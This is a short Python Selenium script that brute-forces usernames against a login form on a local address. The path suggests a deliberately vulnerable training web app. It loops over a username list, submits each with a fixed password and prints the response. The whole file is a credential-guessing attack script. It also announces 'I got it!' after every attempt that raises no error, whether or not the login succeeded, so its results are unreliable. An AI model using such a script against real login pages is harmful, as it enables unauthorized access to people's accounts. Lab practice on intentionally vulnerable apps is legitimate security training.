#!/usr/bin/env python
#-*- coding:utf-8 -*-
from selenium import webdriver
import time
browser=webdriver.Firefox(firefox_profile='/root/.mozilla/firefox/6gyv7tzu.default')
user=[]

def check(user):
    browser.get('http://172.17.0.2/vulnerabilities/brute/')
    time.sleep(0.5)
    browser.find_element_by_xpath(".//*[@id='main_body']/div/div/form/input[1]").send_keys(user)
    browser.find_element_by_xpath(".//*[@id='main_body']/div/div/form/input[2]").send_keys("1")
    browser.find_element_by_xpath(".//*[@id='main_body']/div/div/form/input[3]").click()
    time.sleep(1)
    context = browser.find_element_by_xpath(".//*[@id='main_body']/div/div/p").text
    print(context)

a = raw_input('If you are ready,please click [Enter]')

with open("username.txt") as f:
    for line in f:
        try:
            check(line)
            print("I got it! The answer is "+line)
        except:
            continue
